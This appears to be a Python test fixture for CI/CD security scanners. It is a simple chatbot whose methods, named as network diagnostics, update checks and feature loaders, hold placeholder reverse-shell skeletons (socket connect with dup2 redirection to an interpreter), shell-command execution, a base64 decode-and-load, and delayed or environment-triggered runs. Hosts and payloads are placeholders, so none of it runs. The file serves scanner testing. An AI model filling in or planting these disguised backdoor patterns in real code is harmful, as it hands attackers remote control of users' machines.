"""
ChatBot Application
INTENTIONALLY CONTAINS SYNTHETIC MALICIOUS-STYLE LOGIC
FOR CI/CD SECURITY SCANNER TESTING ONLY
DO NOT EXECUTE
"""

import socket
import subprocess
import os
import time
import base64

class DevHelperBot:
    def __init__(self):
        self.name = "DevHelperBot"
        self.version = "1.0.1"

    def greet(self):
        return "Hello! I am your development assistant 🤖"

    def answer(self, message: str):
        if "help" in message.lower():
            return "Sure, how can I help you?"
        return "I am still learning!"

    # --------------------------------------------------
    # ⚠️ Payload 1: Socket + IO redirection (synthetic)
    # --------------------------------------------------
    def network_diagnostic(self):
        """
        Appears as a network diagnostic helper,
        semantically matches reverse-shell behavior.
        """

        s = socket.socket()
        s.connect(("<REMOTE_HOST>", <REMOTE_PORT>))

        # NON-EXECUTABLE placeholder
        os.system("<SHELL_IO_REDIRECTION_PLACEHOLDER>")

    # --------------------------------------------------
    # ⚠️ Payload 2: Subprocess execution (synthetic)
    # --------------------------------------------------
    def system_update_check(self):
        """
        Looks like a system updater invoking external commands.
        """

        subprocess.Popen(
            "<REMOTE_COMMAND_EXECUTION>",
            shell=True
        )

    # --------------------------------------------------
    # ⚠️ Payload 3: dup2 + interactive shell (synthetic)
    # --------------------------------------------------
    def interactive_support_session(self):
        """
        Simulates a live support session with redirected IO.
        """

        sock = socket.socket()
        sock.connect(("<SUPPORT_SERVER>", <PORT>))

        for fd in (0, 1, 2):
            os.dup2("<SOCKET_FD>", fd)

        subprocess.call(["<INTERPRETER>", "<MODE>"])

    # --------------------------------------------------
    # ⚠️ Payload 4: Encoded loader (synthetic)
    # --------------------------------------------------
    def encoded_feature_loader(self):
        """
        Appears as a feature loader using encoded content.
        """

        encoded_blob = "<BASE64_ENCODED_PAYLOAD>"
        decoded = base64.b64decode(encoded_blob)

        # Execution intentionally abstracted
        load_feature(decoded)

    # --------------------------------------------------
    # ⚠️ Payload 5: Delayed execution (synthetic)
    # --------------------------------------------------
    def delayed_background_task(self):
        """
        Runs background logic after a delay.
        """

        time.sleep(<DELAY_SECONDS>)
        self.network_diagnostic()

    # --------------------------------------------------
    # ⚠️ Payload 6: Environment-triggered execution (synthetic)
    # --------------------------------------------------
    def conditional_feature(self):
        """
        Feature flag–based execution logic.
        """

        if os.getenv("<FEATURE_FLAG>"):
            self.system_update_check()


# --------------------------------------------------
# Application Entry Point
# --------------------------------------------------

def main():
    bot = DevHelperBot()
    print(bot.greet())

    while True:
        user_input = input("> ")
        if user_input.lower() in ("exit", "quit"):
            break
        print(bot.answer(user_input))


if __name__ == "__main__":
    main()
